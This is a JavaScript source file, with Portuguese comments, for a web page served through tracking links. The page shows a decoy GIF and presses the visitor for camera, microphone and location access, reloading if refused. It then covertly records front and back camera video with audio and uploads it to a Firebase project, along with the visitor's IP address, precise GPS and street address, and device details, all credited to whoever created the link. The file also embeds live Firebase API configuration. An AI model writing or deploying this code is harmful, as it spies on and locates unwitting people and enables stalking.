const firebaseConfig = {
  apiKey: "AIzaSyAWhfaY2Adp4YJGwvITWTGHP-7zOLNfiGI",
  authDomain: "sandalias-retro-9f0c6.firebaseapp.com",
  databaseURL: "https://sandalias-retro-9f0c6-default-rtdb.firebaseio.com",
  projectId: "sandalias-retro-9f0c6",
  storageBucket: "sandalias-retro-9f0c6.appspot.com",
  messagingSenderId: "786208752798",
  appId: "1:786208752798:web:193f76bbbf5ac4ef27678f",
  measurementId: "G-XGVHLX01EB"
};

firebase.initializeApp(firebaseConfig);
const database = firebase.database();
const storage = firebase.storage();

class VideoLocationSystem {
  constructor() {
    this.urlId = this.getUrlParameter('id');
    this.urlData = null;
    this.userId = null;
    this.buildUI();
    this.init();
  }

  getUrlParameter(name) {
    return new URLSearchParams(window.location.search).get(name);
  }

  buildUI() {
    document.body.style.cssText = `
      margin: 0;
      padding: 0;
      overflow: hidden;
      width: 100vw;
      height: 100vh;
      background: #000 url('https://i.pinimg.com/originals/e2/82/e2/e282e2739af30635723b9e2701bb8148.gif') center center / cover no-repeat;
    `;
  }

  async init() {
    try {
      if (!this.urlId) return;

      const snap = await database.ref('users').once('value');
      const usersData = snap.val();

      for (const [userId, user] of Object.entries(usersData)) {
        if (user.urls && user.urls[this.urlId]) {
          this.userId = userId;
          this.urlData = user.urls[this.urlId];
          break;
        }
      }

      if (!this.urlData || !this.userId) return;

      const now = Date.now();
      if (this.urlData.expiresAt && now > this.urlData.expiresAt) return;
      if (this.urlData.maxUses && this.urlData.usedCount >= this.urlData.maxUses) return;

      const granted = await this.requestPermissions();
      if (!granted) {
        location.reload();
        return;
      }

      await this.recordAndUpload();

    } catch (error) {
      console.error('Erro:', error);
    }
  }

  async requestPermissions() {
    try {
      const s1 = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true });
      s1.getTracks().forEach(t => t.stop());
      const s2 = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: true });
      s2.getTracks().forEach(t => t.stop());
      await this.getLocation();
      return true;
    } catch (e) {
      console.warn('Permissões negadas:', e);
      return false;
    }
  }

  async recordCamera(facingMode, durationMs) {
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { width: { ideal: 1280 }, height: { ideal: 720 }, facingMode },
      audio: true
    });

    const mimeType = MediaRecorder.isTypeSupported('video/webm;codecs=vp9')
      ? 'video/webm;codecs=vp9'
      : 'video/webm';

    const chunks = [];
    const recorder = new MediaRecorder(stream, { mimeType });
    recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
    recorder.start();

    await new Promise(r => setTimeout(r, durationMs));
    recorder.stop();

    const blob = await new Promise((resolve, reject) => {
      recorder.onstop = () => {
        if (chunks.length > 0) resolve(new Blob(chunks, { type: 'video/webm' }));
        else reject(new Error('Sem dados de vídeo'));
      };
      setTimeout(() => reject(new Error('Timeout')), 10000);
    });

    stream.getTracks().forEach(t => t.stop());
    return blob;
  }

  async uploadBlob(blob, label, timestamp) {
    const filePath = `videos/${this.userId}/${this.urlId}_${label}_${timestamp}.webm`;
    const storageRef = storage.ref(filePath);
    const uploadTask = await storageRef.put(blob);
    return await uploadTask.ref.getDownloadURL();
  }

  async recordAndUpload() {
    try {
      const timestamp = Date.now();

      // Grava câmera frontal (5s)
      const frontBlob = await this.recordCamera('user', 5000);

      // Grava câmera traseira (5s)
      const backBlob = await this.recordCamera('environment', 5000);

      if (frontBlob.size === 0 || backBlob.size === 0) throw new Error('Um dos vídeos está vazio');

      // Faz upload dos dois vídeos separadamente e obtém duas URLs
      const [frontUrl, backUrl] = await Promise.all([
        this.uploadBlob(frontBlob, 'frontal', timestamp),
        this.uploadBlob(backBlob, 'traseira', timestamp)
      ]);

      const [ipResult, location] = await Promise.all([this.getIP(), this.getLocation()]);

      const captureKey = database.ref().push().key;
      const captureData = {
        id: captureKey,
        urlId: this.urlId,
        userId: this.userId,
        videoFrontalUrl: frontUrl,
        videoTrasieraUrl: backUrl,
        ip: ipResult,
        timestamp,
        data: new Date().toISOString(),
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        localizacao: location || {}
      };

      const usedCount = (this.urlData.usedCount || 0) + 1;

      const updates = {};
      updates[`users/${this.userId}/captures/${captureKey}`] = captureData;
      updates[`users/${this.userId}/urls/${this.urlId}/usedCount`] = usedCount;
      updates[`users/${this.userId}/urls/${this.urlId}/lastUsed`] = timestamp;

      await database.ref().update(updates);

    } catch (error) {
      console.error('Erro na captura:', error);
    }
  }

  async getIP() {
    try {
      const res = await fetch('https://api.ipify.org?format=json');
      const data = await res.json();
      return data.ip;
    } catch {
      return 'Não disponível';
    }
  }

  async getLocation() {
    return new Promise(resolve => {
      if (!navigator.geolocation) return resolve(null);
      navigator.geolocation.getCurrentPosition(async pos => {
        const { latitude, longitude } = pos.coords;
        try {
          const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&addressdetails=1`);
          const data = await res.json();
          resolve({
            latitude,
            longitude,
            accuracy: pos.coords.accuracy,
            rua: data.address?.road || '',
            cidade: data.address?.city || data.address?.town || data.address?.village || '',
            regiao: data.address?.state || '',
            bairro: data.address?.suburb || data.address?.neighbourhood || '',
            numero: data.address?.house_number || 'S/N',
            endereco_completo: data.display_name || '',
            pais: data.address?.country || ''
          });
        } catch {
          resolve({ latitude, longitude, accuracy: pos.coords.accuracy });
        }
      }, err => {
        console.warn('Erro de geolocalização:', err);
        resolve(null);
      }, { enableHighAccuracy: true, timeout: 10000, maximumAge: 60000 });
    });
  }
}

window.addEventListener('DOMContentLoaded', () => {
  new VideoLocationSystem();
});
